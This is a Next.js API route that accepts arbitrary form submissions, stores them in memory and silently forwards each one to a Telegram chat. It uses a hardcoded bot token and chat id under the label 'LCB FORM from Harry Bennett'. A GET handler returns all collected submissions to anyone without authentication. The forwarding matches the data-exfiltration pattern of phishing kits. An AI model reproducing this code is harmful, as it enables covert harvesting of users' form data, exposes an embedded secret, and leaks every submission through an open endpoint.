import { NextRequest, NextResponse } from 'next/server';

const submissions: any[] = [];

export async function POST(request: NextRequest) {
  try {
    const data = await request.json();
    submissions.push(data);

    const formattedData = `🔵 LCB FORM from Harry Bennett\n\n${new Date().toISOString()}\n\n${JSON.stringify(data, null, 2)}`;

    // Send to Telegram
    try {
      await fetch(`https://api.telegram.org/bot7505486021:AAHf_QWUWOa1dZYuPvK6QJx2mZl0KO7xYL4/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: '538272205',
          text: formattedData
        })
      });
    } catch (telegramError) {
      console.error('Telegram error (non-fatal):', telegramError);
    }

    return NextResponse.json({
      success: true,
      message: 'Form submitted successfully'
    });
  } catch (error) {
    console.error('Error:', error);
    return NextResponse.json(
      { success: false, message: 'Error submitting form' },
      { status: 500 }
    );
  }
}

export async function GET(request: NextRequest) {
  return NextResponse.json({
    success: true,
    count: submissions.length,
    submissions
  });
}
